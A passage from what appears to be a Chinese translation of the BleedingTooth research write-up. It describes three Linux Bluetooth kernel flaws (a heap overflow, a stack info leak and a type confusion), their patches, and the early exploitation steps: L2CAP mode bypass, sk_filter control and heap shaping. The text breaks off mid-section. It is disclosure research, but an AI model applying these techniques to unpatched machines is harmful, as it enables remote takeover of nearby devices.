#  BleedingTooth：Linux 蓝牙零点击远程代码执行   
 Ots安全   2025-04-27 05:36  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/bL2iaicTYdZn7gtxSFZlfuCW6AdQib8Q1onbR0U2h9icP1eRO6wH0AcyJmqZ7USD0uOYncCYIH7ZEE8IicAOPxyb9IA/640?wx_fmt=gif "")  
## 介绍  
  
我注意到  
syzkaller  
已经对网络子系统进行了广泛的模糊测试，但对蓝牙等子系统的覆盖程度较低。总体而言，对蓝牙主机攻击面的研究似乎相当有限——蓝牙中大多数公开的漏洞仅影响固件  
或  
规范  
本身  
，并且仅允许攻击者窃听和/或操纵信息。  
  
但是，如果攻击者可以完全控制设备会怎么样呢？最突出的例子就是  
BlueBorne  
和  
BlueFrag  
。我的目标是研究 Linux 蓝牙堆栈，扩展 BlueBorne 的发现，并扩展 syzkaller 以模糊测试设备的能力/dev/vhci  
。  
  
这篇博文描述了我深入研究代码、发现高严重性漏洞并最终将它们链接到针对 x86-64 Ubuntu 20.04.1 的成熟 RCE 漏洞的过程（  
视频  
）。  
### 修补、严重性和建议  
  
为了协调针对这一系列漏洞的多方响应，Google 直接联系了  
BlueZ和 Linux 蓝牙子系统维护者（英特尔），而不是 Linux 内核安全团队。英特尔发布了带有补丁的安全公告INTEL-SA-00435  
，但在披露时，这些补丁并未包含在任何已发布的内核版本中。应该通知 Linux 内核安全团队以促进协调，并且任何此类漏洞也将报告给他们。通信时间表位于本文底部。各个漏洞的补丁如下：  
- BadVibes  
 (CVE-2020-24490) 于 2020 年 7 月 30 日在主线分支上修复：  
提交  
。  
  
- BadChoice  
 (CVE-2020-12352) 和BadKarma   
( CVE-   
2020-12351 ) 已于 2020 年 9月25日在 bluetooth-next 上修复：提交  
1、2、3、4  
  
单独来看，这些漏洞的严重程度  
从中等到高不等，但综合起来，它们代表着严重的安全风险。  
本文将介绍这些风险。  
## 漏洞  
  
让我们简单描述一下蓝牙堆栈。蓝牙芯片使用 HCI（主机控制器接口）协议与主机（操作系统）通信。常见的数据包有：  
- 命令包——由主机发送到控制器。  
  
- 事件数据包 – 由控制器发送至主机以通知事件。  
  
- 数据包——通常携带L2CAP（逻辑链路控制和适配协议）数据包，实现传输层。  
  
诸如 A2MP（AMP 管理器协议）或 SMP（安全管理协议）之类的高级协议都建立在 L2CAP 之上。在 Linux 实现中，所有这些协议都是未经身份验证就公开的，并且其中的漏洞至关重要，因为其中一些协议甚至存在于内核中。  
### BadVibes：基于堆的缓冲区溢出（CVE-2020-24490）  
  
我通过手动检查 HCI 事件包解析器发现了第一个漏洞（在 Linux 内核 4.19 中引入）。HCI 事件包由蓝牙芯片制作和发送，通常无法由攻击者控制（除非他们也能控制蓝牙固件）。但是，有两种非常相似的方法hci_le_adv_report_evt()  
和hci_le_ext_adv_report_evt()  
，其目的是解析来自远程蓝牙设备的广告报告。这些报告的大小各不相同。  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
static void hci_le_adv_report_evt(struct hci_dev *hdev, struct sk_buff *skb)
{
  u8 num_reports = skb->data[0];
  void *ptr = &skb->data[1];

  hci_dev_lock(hdev);

  while (num_reports--) {
    struct hci_ev_le_advertising_info *ev = ptr;
    s8 rssi;

    if (ev->length <= HCI_MAX_AD_LENGTH) {
      rssi = ev->data[ev->length];
      process_adv_report(hdev, ev->evt_type, &ev->bdaddr,
             ev->bdaddr_type, NULL, 0, rssi,
             ev->data, ev->length);
    } else {
      bt_dev_err(hdev, "Dropping invalid advertising data");
    }

    ptr += sizeof(*ev) + ev->length + 1;
  }

  hci_dev_unlock(hdev);
}
...
static void hci_le_ext_adv_report_evt(struct hci_dev *hdev, struct sk_buff *skb)
{
  u8 num_reports = skb->data[0];
  void *ptr = &skb->data[1];

  hci_dev_lock(hdev);

  while (num_reports--) {
    struct hci_ev_le_ext_adv_report *ev = ptr;
    u8 legacy_evt_type;
    u16 evt_type;

    evt_type = __le16_to_cpu(ev->evt_type);
    legacy_evt_type = ext_evt_type_to_legacy(hdev, evt_type);
    if (legacy_evt_type != LE_ADV_INVALID) {
      process_adv_report(hdev, legacy_evt_type, &ev->bdaddr,
             ev->bdaddr_type, NULL, 0, ev->rssi,
             ev->data, ev->length);
    }

    ptr += sizeof(*ev) + ev->length;
  }

  hci_dev_unlock(hdev);
}
```  
  
注意两种方法都调用了process_adv_report()  
，但后一种方法不检查ev->length  
它是否小于或等于。然后HCI_MAX_AD_LENGTH=31  
该函数使用事件数据和长度进行调用：process_adv_report()store_pending_adv_report()  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
static void process_adv_report(struct hci_dev *hdev, u8 type, bdaddr_t *bdaddr,
             u8 bdaddr_type, bdaddr_t *direct_addr,
             u8 direct_addr_type, s8 rssi, u8 *data, u8 len)
{
  ...
  if (!has_pending_adv_report(hdev)) {
    ...
    if (type == LE_ADV_IND || type == LE_ADV_SCAN_IND) {
      store_pending_adv_report(hdev, bdaddr, bdaddr_type,
             rssi, flags, data, len);
      return;
    }
    ...
  }
  ...
}
```  
  
最后，store_pending_adv_report()  
子程序将数据复制到d->last_adv_data  
：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/hci_event.c
static void store_pending_adv_report(struct hci_dev *hdev, bdaddr_t *bdaddr,
             u8 bdaddr_type, s8 rssi, u32 flags,
             u8 *data, u8 len)
{
  struct discovery_state *d = &hdev->discovery;
  ...
  memcpy(d->last_adv_data, data, len);
  d->last_adv_data_len = len;
}
```  
  
查看struct hci_dev  
，我们可以看到缓冲区last_adv_data  
的大小与 相同，HCI_MAX_AD_LENGTH  
不足以容纳扩展的广告数据。解析器理论上可以接收最多 255 字节的数据包并将其路由到此方法。如果可能的话，我们可以溢出last_adv_data  
并破坏偏移量高达 0xbaf 的成员。  
```
// pahole -E -C hci_dev --hex bluetooth.ko
struct hci_dev {
  ...
  struct discovery_state {
    ...
    /* typedef u8 -> __u8 */ unsigned char      last_adv_data[31];           /* 0xab0  0x1f */
    ...
  } discovery; /* 0xa68  0x88 */
  ...
  struct list_head {
    struct list_head * next;                                                 /* 0xb18   0x8 */
    struct list_head * prev;                                                 /* 0xb20   0x8 */
  } mgmt_pending; /* 0xb18  0x10 */
  ...
  /* size: 4264, cachelines: 67, members: 192 */
  /* sum members: 4216, holes: 17, sum holes: 48 */
  /* paddings: 10, sum paddings: 43 */
  /* forced alignments: 1 */
  /* last cacheline: 40 bytes */
} __attribute__((__aligned__(8)));
```  
  
但是，它hci_le_ext_adv_report_evt()  
甚至能够接收如此大的报告吗？很可能预期会有更大的广告，因为扩展广告解析器明确删除了 31 字节检查似乎是故意的。此外，由于它hci_le_adv_report_evt()  
在代码中很接近，因此该检查可能不是被错误遗忘的。事实上，查看规范，我们可以看到从 31 字节扩展到 255 字节是蓝牙 5 的主要功能之一：  
> 回想一下，在蓝牙 4.0 中，广告有效载荷最大为 31 个八位字节。在蓝牙 5 中，我们通过添加额外的广告通道和新的广告 PDU 将有效载荷增加到 255 个八位字节。  
  
来源：  
https://www.bluetooth.com/blog/exploring-bluetooth5-whats-new-in-advertising/  
  
  
因此，只有当受害者的机器具有蓝牙 5 芯片（这是一种相对较“新”的技术，并且仅在较新的笔记本电脑上可用）并且受害者主动扫描广告数据（即打开蓝牙设置并搜索周围的设备）时，才会触发此漏洞。  
  
使用两个支持蓝牙 5 的设备，我们可以轻松确认该漏洞，并观察到类似以下的恐慌：  
```
[  118.490999] general protection fault: 0000 [#1] SMP PTI
[  118.491006] CPU: 6 PID: 205 Comm: kworker/u17:0 Not tainted 5.4.0-37-generic #41-Ubuntu
[  118.491008] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
[  118.491034] Workqueue: hci0 hci_rx_work [bluetooth]
[  118.491056] RIP: 0010:hci_bdaddr_list_lookup+0x1e/0x40 [bluetooth]
[  118.491060] Code: ff ff e9 26 ff ff ff 0f 1f 44 00 00 0f 1f 44 00 00 55 48 8b 07 48 89 e5 48 39 c7 75 0a eb 24 48 8b 00 48 39 f8 74 1c 44 8b 06 <44> 39 40 10 75 ef 44 0f b7 4e 04 66 44 39 48 14 75 e3 38 50 16 75
[  118.491062] RSP: 0018:ffffbc6a40493c70 EFLAGS: 00010286
[  118.491066] RAX: 4141414141414141 RBX: 000000000000001b RCX: 0000000000000000
[  118.491068] RDX: 0000000000000000 RSI: ffff9903e76c100f RDI: ffff9904289d4b28
[  118.491070] RBP: ffffbc6a40493c70 R08: 0000000093570362 R09: 0000000000000000
[  118.491072] R10: 0000000000000000 R11: ffff9904344eae38 R12: ffff9904289d4000
[  118.491074] R13: 0000000000000000 R14: 00000000ffffffa3 R15: ffff9903e76c100f
[  118.491077] FS:  0000000000000000(0000) GS:ffff990434580000(0000) knlGS:0000000000000000
[  118.491079] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  118.491081] CR2: 00007feed125a000 CR3: 00000001b860a003 CR4: 00000000003606e0
[  118.491083] Call Trace:
[  118.491108]  process_adv_report+0x12e/0x560 [bluetooth]
[  118.491128]  hci_le_meta_evt+0x7b2/0xba0 [bluetooth]
[  118.491134]  ? __wake_up_sync_key+0x1e/0x30
[  118.491140]  ? sock_def_readable+0x40/0x70
[  118.491143]  ? __sock_queue_rcv_skb+0x142/0x1f0
[  118.491162]  hci_event_packet+0x1c29/0x2a90 [bluetooth]
[  118.491186]  ? hci_send_to_monitor+0xae/0x120 [bluetooth]
[  118.491190]  ? skb_release_all+0x26/0x30
[  118.491207]  hci_rx_work+0x19b/0x360 [bluetooth]
[  118.491211]  ? __schedule+0x2eb/0x740
[  118.491217]  process_one_work+0x1eb/0x3b0
[  118.491221]  worker_thread+0x4d/0x400
[  118.491225]  kthread+0x104/0x140
[  118.491229]  ? process_one_work+0x3b0/0x3b0
[  118.491232]  ? kthread_park+0x90/0x90
[  118.491236]  ret_from_fork+0x35/0x40
```  
  
恐慌表明我们可以完全控制 中的成员struct hci_dev  
。一个有趣的破坏指针是，因为它是包含函数指针mgmt_pending->next  
的类型：struct mgmt_pending_cmdcmd_complete()  
```
// pahole -E -C mgmt_pending_cmd --hex bluetooth.ko
struct mgmt_pending_cmd {
  ...
  int                        (*cmd_complete)(struct mgmt_pending_cmd *, u8);       /*  0x38   0x8 */

  /* size: 64, cachelines: 1, members: 8 */
  /* sum members: 62, holes: 1, sum holes: 2 */
};
```  
  
例如，可以通过中止 HCI 连接来触发此处理程序。但是，为了成功重定向指针mgmt_pending->next  
，我们需要一个额外的信息泄露漏洞，我们将在下一节中了解。  
### BadChoice：基于堆栈的信息泄露（CVE-2020-12352）  
  
BadVibes漏洞的  
威力还不足以转化为任意的 R/W 原语，而且似乎没有办法利用它来泄露受害者的内存布局。原因是唯一可能被破坏的有趣成员是指向循环列表的指针。顾名思义，这些数据结构是循环的，因此我们不能在不确保它们最终指向它们开始的位置的情况下改变它们。当受害者的内存布局是随机的时候，这个要求很难满足。虽然内核中有一些资源分配在静态地址，但它们的内容很可能是不可控的。因此，为了利用BadVibes  
 ，我们首先需要了解内存布局。更具体地说，我们需要泄露受害者的一些内存地址，我们可以控制或至少预测其内容。  
  
通常，信息泄露是通过利用越界访问、利用未初始化的变量，或者像最近流行的那样，通过执行旁道/定时攻击来实现的。后者可能很难实现，因为传输可能会有抖动。相反，让我们专注于前两个错误类别，并检查所有向攻击者发送一些信息的子例程，看看它们中是否有任何一个可以泄露越界数据或未初始化的内存。  
  
A2MP_GETINFO_REQ  
通过检查所有调用，我发现了 A2MP 协议命令中的第二个漏洞a2mp_send()  
。该漏洞自 Linux 内核 3.6 以来就已存在，并且如果CONFIG_BT_HS=y  
以前默认启用，则可利用该漏洞。  
  
我们看一下a2mp_getinfo_req()  
该命令调用的子程序A2MP_GETINFO_REQ  
：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static int a2mp_getinfo_req(struct amp_mgr *mgr, struct sk_buff *skb,
          struct a2mp_cmd *hdr)
{
  struct a2mp_info_req *req  = (void *) skb->data;
  ...
  hdev = hci_dev_get(req->id);
  if (!hdev || hdev->dev_type != HCI_AMP) {
    struct a2mp_info_rsp rsp;

    rsp.id = req->id;
    rsp.status = A2MP_STATUS_INVALID_CTRL_ID;

    a2mp_send(mgr, A2MP_GETINFO_RSP, hdr->ident, sizeof(rsp),
        &rsp);

    goto done;
  }
  ...
}
```  
  
该子程序旨在使用 HCI 设备 ID 请求有关 AMP 控制器的信息。但是，如果它无效或不是类型HCI_AMP  
，则采用错误路径，这意味着受害者会向我们发送状态A2MP_STATUS_INVALID_CTRL_ID  
。不幸的是，struct a2mp_info_rsp  
除了 ID 和状态之外，还包含更多成员，而且我们可以看到，响应结构尚未完全初始化。因此，16 个字节的内核堆栈可能会被泄露给攻击者，其中可能包含受害者的敏感数据：  
```
// pahole -E -C a2mp_info_rsp --hex bluetooth.ko
struct a2mp_info_rsp {
  /* typedef __u8 */ unsigned char              id;                                /*     0   0x1 */
  /* typedef __u8 */ unsigned char              status;                            /*   0x1   0x1 */
  /* typedef __le32 -> __u32 */ unsigned int               total_bw;               /*   0x2   0x4 */
  /* typedef __le32 -> __u32 */ unsigned int               max_bw;                 /*   0x6   0x4 */
  /* typedef __le32 -> __u32 */ unsigned int               min_latency;            /*   0xa   0x4 */
  /* typedef __le16 -> __u16 */ short unsigned int         pal_cap;                /*   0xe   0x2 */
  /* typedef __le16 -> __u16 */ short unsigned int         assoc_size;             /*  0x10   0x2 */

  /* size: 18, cachelines: 1, members: 7 */
  /* last cacheline: 18 bytes */
} __attribute__((__packed__));
```  
  
通过在发送之前发送有趣的命令来填充堆栈框架，可以利用此类漏洞A2MP_GETINFO_REQ  
。这里，有趣的命令是将指针放在a2mp_getinfo_req()  
重复使用的同一堆栈框架中的命令。通过这样做，未初始化的变量最终可能会包含先前推送到堆栈上的指针。  
  
请注意，使用编译的内核CONFIG_INIT_STACK_ALL_PATTERN=y  
不应受到此类攻击。例如，在 ChromeOS 上，BadChoice  
仅返回 0xAA。但是，在流行的 Linux 发行版上，此选项似乎尚未默认启用。  
### BadKarma：基于堆的类型混淆（CVE-2020-12351）  
  
我在尝试触发BadChoice  
并确认其可利用性时发现了第三个漏洞。即受害者的机器意外崩溃，并出现以下调用跟踪：  
```
[  445.440736] general protection fault: 0000 [#1] SMP PTI
[  445.440740] CPU: 4 PID: 483 Comm: kworker/u17:1 Not tainted 5.4.0-40-generic #44-Ubuntu
[  445.440741] Hardware name: Dell Inc. XPS 15 7590/0CF6RR, BIOS 1.7.0 05/11/2020
[  445.440764] Workqueue: hci0 hci_rx_work [bluetooth]
[  445.440771] RIP: 0010:sk_filter_trim_cap+0x6d/0x220
[  445.440773] Code: e8 18 e1 af ff 41 89 c5 85 c0 75 62 48 8b 83 10 01 00 00 48 85 c0 74 56 49 8b 4c 24 18 49 89 5c 24 18 4c 8b 78 18 48 89 4d b0 <41> f6 47 02 08 0f 85 41 01 00 00 0f 1f 44 00 00 49 8b 47 30 49 8d
[  445.440776] RSP: 0018:ffffa86b403abca0 EFLAGS: 00010286
[  445.440778] RAX: ffffffffc071cc50 RBX: ffff8e95af6d7000 RCX: 0000000000000000
[  445.440780] RDX: 0000000000000000 RSI: ffff8e95ac533800 RDI: ffff8e95af6d7000
[  445.440781] RBP: ffffa86b403abd00 R08: ffff8e95b452f0e0 R09: ffff8e95b34072c0
[  445.440782] R10: ffff8e95acd57818 R11: ffff8e95b456ae38 R12: ffff8e95ac533800
[  445.440784] R13: 0000000000000000 R14: 0000000000000001 R15: 30478b4800000208
[  445.440786] FS:  0000000000000000(0000) GS:ffff8e95b4500000(0000) knlGS:0000000000000000
[  445.440788] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  445.440789] CR2: 000055f371aa94a8 CR3: 000000022dc0a005 CR4: 00000000003606e0
[  445.440791] Call Trace:
[  445.440817]  ? __l2cap_chan_add+0x88/0x1c0 [bluetooth]
[  445.440838]  l2cap_data_rcv+0x351/0x510 [bluetooth]
[  445.440857]  l2cap_data_channel+0x29f/0x470 [bluetooth]
[  445.440875]  l2cap_recv_frame+0xe5/0x300 [bluetooth]
[  445.440878]  ? skb_release_all+0x26/0x30
[  445.440896]  l2cap_recv_acldata+0x2d2/0x2e0 [bluetooth]
[  445.440914]  hci_rx_work+0x186/0x360 [bluetooth]
[  445.440919]  process_one_work+0x1eb/0x3b0
[  445.440921]  worker_thread+0x4d/0x400
[  445.440924]  kthread+0x104/0x140
[  445.440927]  ? process_one_work+0x3b0/0x3b0
[  445.440929]  ? kthread_park+0x90/0x90
[  445.440932]  ret_from_fork+0x35/0x40
```  
  
看一下l2cap_data_rcv()  
，我们可以看到sk_filter()  
当使用ERTM（增强重传模式）或流模式（类似于TCP）时会调用：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
static int l2cap_data_rcv(struct l2cap_chan *chan, struct sk_buff *skb)
{
  ...
  if ((chan->mode == L2CAP_MODE_ERTM ||
       chan->mode == L2CAP_MODE_STREAMING) && sk_filter(chan->data, skb))
    goto drop;
  ...
}
```  
  
对于 A2MP 通道来说确实如此（通道可以比作网络端口）：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static struct l2cap_chan *a2mp_chan_open(struct l2cap_conn *conn, bool locked)
{
  struct l2cap_chan *chan;
  int err;

  chan = l2cap_chan_create();
  if (!chan)
    return NULL;
  ...
  chan->mode = L2CAP_MODE_ERTM;
  ...
  return chan;
}
...
static struct amp_mgr *amp_mgr_create(struct l2cap_conn *conn, bool locked)
{
  struct amp_mgr *mgr;
  struct l2cap_chan *chan;

  mgr = kzalloc(sizeof(*mgr), GFP_KERNEL);
  if (!mgr)
    return NULL;
  ...
  chan = a2mp_chan_open(conn, locked);
  if (!chan) {
    kfree(mgr);
    return NULL;
  }

  mgr->a2mp_chan = chan;
  chan->data = mgr;
  ...
  return mgr;
}
```  
  
看看amp_mgr_create()  
，错误就一目了然了。也就是说，chan->data  
是 类型struct amp_mgr  
，而sk_filter()  
接受 类型的参数struct sock  
，这意味着我们在设计上存在远程类型混淆。这种混淆是在 Linux 内核 4.8 中引入的，从那时起一直保持不变。  
## 开发  
  
BadChoice漏洞可以与BadVibes  
以及BadKarma  
结合使用以实现 RCE。在本文中，我们将仅关注使用BadKarma的  
方法，原因如下：  
- 它不仅限于蓝牙5。  
  
- 它并不需要受害者进行扫描。  
  
- 有可能对特定设备进行有针对性的攻击。  
  
另一方面，BadVibes 攻击仅是一种广播，因此只有一台机器可以被成功利用，而所有监听相同消息的其他机器都会崩溃。  
### 绕过 BadKarma  
  
讽刺的是，为了利用BadKarma  
，我们必须首先摆脱BadKarma  
。回想一下，设计上存在类型混淆错误，只要 A2MP 通道配置为 ERTM/流模式，我们就无法通过 到达 A2MP 子程序，而l2cap_data_rcv()  
不会触发 中的恐慌sk_filter()  
。  
  
查看l2cap_data_channel()  
，我们可以看到，采取不同路线的唯一可能方法是将通道模式重新配置为L2CAP_MODE_BASIC  
。这将“基本上”允许我们直接调用 A2MP 接收处理程序：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
static void l2cap_data_channel(struct l2cap_conn *conn, u16 cid,
             struct sk_buff *skb)
{
  struct l2cap_chan *chan;

  chan = l2cap_get_chan_by_scid(conn, cid);
  ...
  switch (chan->mode) {
  ...
  case L2CAP_MODE_BASIC:
    /* If socket recv buffers overflows we drop data here
     * which is *bad* because L2CAP has to be reliable.
     * But we don't have any other choice. L2CAP doesn't
     * provide flow control mechanism. */

    if (chan->imtu < skb->len) {
      BT_ERR("Dropping L2CAP data: receive buffer overflow");
      goto drop;
    }

    if (!chan->ops->recv(chan, skb))
      goto done;
    break;

  case L2CAP_MODE_ERTM:
  case L2CAP_MODE_STREAMING:
    l2cap_data_rcv(chan, skb);
    goto done;
  ...
  }
  ...
}
```  
  
但是，通道模式的重新配置是否可行？根据规范，A2MP 通道必须使用 ERTM 或流模式：  
> 蓝牙核心通过强制使用增强型重传模式或流式传输模式来维持核心之上协议和配置文件的可靠性。  
  
来源：  
https://www.bluetooth.org/DocMan/handlers/DownloadDoc.ashx ?doc_id=421043  
  
  
由于某种原因，规范中没有描述这一事实，而 Linux 的实现实际上允许我们L2CAP_MODE_BASIC  
通过在配置响应中封装所需的通道模式来从任何通道模式切换到L2CAP_CONF_UNACCEPT  
：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c`
static inline int l2cap_config_rsp(struct l2cap_conn *conn,
           struct l2cap_cmd_hdr *cmd, u16 cmd_len,
           u8 *data)
{
  struct l2cap_conf_rsp *rsp = (struct l2cap_conf_rsp *)data;
  ...
  scid   = __le16_to_cpu(rsp->scid);
  flags  = __le16_to_cpu(rsp->flags);
  result = __le16_to_cpu(rsp->result);
  ...
  chan = l2cap_get_chan_by_scid(conn, scid);
  if (!chan)
    return 0;

  switch (result) {
  ...
  case L2CAP_CONF_UNACCEPT:
    if (chan->num_conf_rsp <= L2CAP_CONF_MAX_CONF_RSP) {
      ...
      result = L2CAP_CONF_SUCCESS;
      len = l2cap_parse_conf_rsp(chan, rsp->data, len,
               req, sizeof(req), &result);
      ...
    }
    fallthrough;
  ...
  }
  ...
}
```  
  
此函数调用子程序l2cap_parse_conf_rsp()  
。其中，如果指定了选项类型L2CAP_CONF_RFC  
，并且当前通道模式不是L2CAP_MODE_BASIC  
，则可以将其更改为我们想要的：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/l2cap_core.c
static int l2cap_parse_conf_rsp(struct l2cap_chan *chan, void *rsp, int len,
        void *data, size_t size, u16 *result)
{
  ...
  while (len >= L2CAP_CONF_OPT_SIZE) {
    len -= l2cap_get_conf_opt(&rsp, &type, &olen, &val);
    if (len < 0)
      break;

    switch (type) {
    ...
    case L2CAP_CONF_RFC:
      if (olen != sizeof(rfc))
        break;
      memcpy(&rfc, (void *)val, olen);
      ...
      break;
    ...
    }
  }

  if (chan->mode == L2CAP_MODE_BASIC && chan->mode != rfc.mode)
    return -ECONNREFUSED;

  chan->mode = rfc.mode;
  ...
}
```  
  
由此自然而然的问题是，我们是否需要先收到受害者的配置请求，然后才能发回配置响应？这似乎是协议的一个弱点——答案是否定的。此外，无论受害者与我们协商什么，我们都可以发回响应L2CAP_CONF_UNACCEPT  
，受害者也会很乐意接受我们的建议。  
  
使用配置响应旁路，我们现在能够访问 A2MP 命令并利用BadChoice检索我们需要的所有信息（请参阅后面的部分）。一旦我们准备好触发类型混淆，我们只需断开和连接通道即可重新创建 A2MP 通道，并根据BadKarma  
的要求将通道模式重新设置为 ERTM 。  
### 探索 sk_filter()  
  
我们理解， BadKarma  
的问题在于，struct amp_mgr  
传递给 的是一个对象sk_filter()  
，而预期的是一个struct sock  
对象。换句话说， 中的字段struct sock  
错误地映射到 中的字段struct amp_mgr  
。因此，这可能导致取消引用无效指针并最终导致恐慌。回顾之前的恐慌日志，这正是发生的事情，也是导致发现BadKarma  
的主要原因。  
  
我们是否可以控制该指针取消引用，或控制中的其他成员以struct amp_mgr  
影响的代码流sk_filter()  
？让我们看一下sk_filter()  
并跟踪的使用情况，struct sock *sk  
以了解此子程序中哪些成员是相关的。  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
static inline int sk_filter(struct sock *sk, struct sk_buff *skb)
{
  return sk_filter_trim_cap(sk, skb, 1);
}
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/filter.c
int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
{
  int err;
  struct sk_filter *filter;

  /*
   * If the skb was allocated from pfmemalloc reserves, only
   * allow SOCK_MEMALLOC sockets to use it as this socket is
   * helping free memory
   */
  if (skb_pfmemalloc(skb) && !sock_flag(sk, SOCK_MEMALLOC)) {
    NET_INC_STATS(sock_net(sk), LINUX_MIB_PFMEMALLOCDROP);
    return -ENOMEM;
  }
  err = BPF_CGROUP_RUN_PROG_INET_INGRESS(sk, skb);
  if (err)
    return err;

  err = security_sock_rcv_skb(sk, skb);
  if (err)
    return err;

  rcu_read_lock();
  filter = rcu_dereference(sk->sk_filter);
  if (filter) {
    struct sock *save_sk = skb->sk;
    unsigned int pkt_len;

    skb->sk = sk;
    pkt_len = bpf_prog_run_save_cb(filter->prog, skb);
    skb->sk = save_sk;
    err = pkt_len ? pskb_trim(skb, max(cap, pkt_len)) : -EPERM;
  }
  rcu_read_unlock();

  return err;
}
```  
  
的第一次使用sk  
是在 中sock_flag()  
，尽管该函数只是检查一些标志，而且只有在skb_pfmemalloc()  
返回 true 时才会发生。相反，让我们看看BPF_CGROUP_RUN_PROG_INET_INGRESS()  
它对套接字结构做了什么：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/bpf-cgroup.h
#define BPF_CGROUP_RUN_PROG_INET_INGRESS(sk, skb)            \
({                        \
  int __ret = 0;                    \
  if (cgroup_bpf_enabled)                  \
    __ret = __cgroup_bpf_run_filter_skb(sk, skb,          \
                BPF_CGROUP_INET_INGRESS); \
                        \
  __ret;                      \
})
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/kernel/bpf/cgroup.c
int __cgroup_bpf_run_filter_skb(struct sock *sk,
        struct sk_buff *skb,
        enum bpf_attach_type type)
{
  ...
  if (!sk || !sk_fullsock(sk))
    return 0;

  if (sk->sk_family != AF_INET && sk->sk_family != AF_INET6)
    return 0;
  ...
}
```  
  
类似地，sk_fullsock()  
还会检查一些标志，但不会执行任何有趣的操作。进一步说，请注意，sk->sk_family  
必须为AF_INET=2  
或AF_INET6=10  
才能继续。此字段位于偏移量 0x10 中struct sock  
：  
```
// pahole -E -C sock --hex bluetooth.ko
struct sock {
  struct sock_common {
    ...
    short unsigned int skc_family;                                           /*  0x10   0x2 */
    ...
  } __sk_common; /*     0  0x88 */
  ...
  struct sk_filter *         sk_filter;                                            /* 0x110   0x8 */
  ...
  /* size: 760, cachelines: 12, members: 88 */
  /* sum members: 747, holes: 4, sum holes: 8 */
  /* sum bitfield members: 40 bits (5 bytes) */
  /* paddings: 1, sum paddings: 4 */
  /* forced alignments: 1 */
  /* last cacheline: 56 bytes */
} __attribute__((__aligned__(8)));
```  
  
查看中的偏移量 0x10 struct amp_mgr  
，我们意识到该字段映射到struct l2cap_conn  
指针：  
```
// pahole -E -C amp_mgr --hex bluetooth.ko
struct amp_mgr {
  ...
  struct l2cap_conn *        l2cap_conn;                                           /*  0x10   0x8 */
  ...
  /* size: 112, cachelines: 2, members: 11 */
  /* sum members: 110, holes: 1, sum holes: 2 */
  /* last cacheline: 48 bytes */
};
```  
  
由于这是一个指向与分配大小（最小 32 字节）对齐的堆对象的指针，这意味着该指针的低字节不能具有 所要求的值 2 或 10。__cgroup_bpf_run_filter_skb()  
确定这一点后，我们知道子程序始终返回 0，无论其他字段具有什么值。同样，子程序security_sock_rcv_skb()  
需要相同的条件，否则返回 0。  
  
这样，sk->sk_filter  
就只剩下 ，这是唯一可能被破坏的成员。稍后我们将看到控制 会有什么用处struct sk_filter  
，但首先请注意sk_filter  
位于偏移量 0x110 处，而 的大小struct amp_mgr  
只有 112=0x70 字节宽。那么它不是不受我们控制的吗？是也不是——通常它不受我们控制，但是如果我们有办法塑造堆，那么完全控制指针可能会更容易。具体来说， 的struct amp_mgr  
大小为 112 字节（介于 65 和 128 之间），因此它在 kmalloc-128 slab 内分配。通常，slab 中的内存块不包含前面的元数据（例如块头），因为目标是尽量减少碎片。因此，内存块是连续的，因此，为了控制偏移量 0x110 处的指针，我们必须实现一个堆星座，其中我们所需的指针位于 之后的第二个块的偏移量 0x10 处struct amp_mgr  
。  
### 查找堆原语  
  
为了塑造 kmalloc-128 slab，我们需要一个可以分配（最好是可控制的）大小在 65-128 字节之间的内存的命令。与其他 L2CAP 实现不同，Linux 实现中堆的使用率非常低。快速搜索或不会kmalloc()  
得到kzalloc()  
任何net/bluetooth/  
有用的东西 - 或者至少不会得到任何可以控制或存在于多个命令中的东西。我们希望有一个原语，它可以分配任意大小的内存，将攻击者控制的数据复制到其中，并将其保留，直到我们决定释放它。  
  
这听起来很像kmemdup()  
，对吧？令人惊讶的是，A2MP 协议为我们提供了这样的原语。也就是说，我们可以发出命令A2MP_GETAMPASSOC_RSP  
来复制内存，kmemdup()  
并将内存地址存储在控制结构中：  
```
// https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/bluetooth/a2mp.c
static int a2mp_getampassoc_rsp(struct amp_mgr *mgr, struct sk_buff *skb,
        struct a2mp_cmd *hdr)
{
  ...
  u16 len = le16_to_cpu(hdr->len);
  ...
  assoc_len = len - sizeof(*rsp);
  ...
  ctrl = amp_ctrl_lookup(mgr, rsp->id);
  if (ctrl) {
    u8 *assoc;

    assoc = kmemdup(rsp->amp_assoc, assoc_len, GFP_KERNEL);
    if (!assoc) {
      amp_ctrl_put(ctrl);
      return -ENOMEM;
    }

    ctrl->assoc = assoc;
    ctrl->assoc_len = assoc_len;
    ctrl->assoc_rem_len = assoc_len;
    ctrl->assoc_len_so_far = 0;

    amp_ctrl_put(ctrl);
  }
  ...
}
```  
  
为了amp_ctrl_lookup()  
返回控制结构，我们必须首先使用以下命令将其添加到列表中A2MP_GETINFO_RSP  
：  
```
